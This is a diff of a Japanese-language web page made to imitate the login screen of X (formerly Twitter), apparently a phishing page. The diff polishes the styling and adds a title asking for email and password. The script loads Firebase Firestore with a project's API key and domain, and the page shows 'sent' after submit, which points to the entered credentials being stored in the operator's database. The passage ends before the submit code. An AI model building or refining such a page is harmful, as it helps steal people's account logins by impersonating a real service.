@@ -5,18 +5,34 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Xアカウントにログイン</title>
 <style>
-body { background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh;}
-.container { max-width:420px; width:100%; padding:16px;}
-.card { background:#111; padding:30px; border-radius:20px;}
-label { display:block; margin-top:12px;}
-input { width:100%; padding:10px; margin-top:4px; border-radius:8px; border:none;}
-.btn-login { width:100%; padding:14px; background:#fff; color:#000; border:none; border-radius:30px; cursor:pointer; font-weight:700; margin-top:20px;}
-#result-screen { display:none; margin-top:20px; text-align:center;}
+* { box-sizing: border-box; margin:0; padding:0; }
+body { 
+  background:#000; 
+  color:#fff; 
+  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+  display:flex; 
+  justify-content:center; 
+  align-items:center; 
+  min-height:100vh;
+}
+.container { max-width:420px; width:100%; padding:16px; display:flex; flex-direction:column; align-items:center; }
+.card { background:#111; padding:40px 30px; border-radius:20px; width:100%; box-shadow:0 0 10px rgba(255,255,255,0.1);}
+.title { font-size:24px; font-weight:800; margin-bottom:12px; text-align:center; }
+.subtitle { font-size:14px; color:#888; text-align:center; margin-bottom:20px; }
+label { display:block; margin-top:12px; font-weight:600; }
+input { width:100%; padding:14px; margin-top:4px; border-radius:12px; border:1px solid #333; background:#000; color:#fff; font-size:16px; }
+input:focus { border-color:#fff; outline:none; }
+.btn-login { width:100%; padding:14px; background:#fff; color:#000; border:none; border-radius:30px; cursor:pointer; font-weight:700; margin-top:20px; }
+.btn-login:hover { opacity:0.9; }
+#result-screen { display:none; margin-top:20px; text-align:center; font-size:16px; color:#fff; }
 </style>
 </head>
 <body>
 <div class="container">
   <div class="card">
+    <div class="title">Xアカウントにログイン</div>
+    <div class="subtitle">メールアドレスとパスワードを入力してください</div>
+
     <form id="login-form">
       <label>アカウント</label>
       <input type="text" id="account" placeholder="電話番号、メールアドレスまたはユーザー名" required>
@@ -24,6 +40,7 @@ input { width:100%; padding:10px; margin-top:4px; border-radius:8px; border:none
       <input type="password" id="password" placeholder="パスワードを入力" required>
       <button type="submit" class="btn-login">ログイン</button>
     </form>
+
     <div id="result-screen">
       <p>送信完了！</p>
     </div>
@@ -34,7 +51,7 @@ input { width:100%; padding:10px; margin-top:4px; border-radius:8px; border:none
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
 import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
 
-// 🔹 あなたの Firebase Web アプリ情報に置き換える
+// 🔹 Firebase設定
 const firebaseConfig = {
   apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
   authDomain: "daada-ae048.firebaseapp.com",
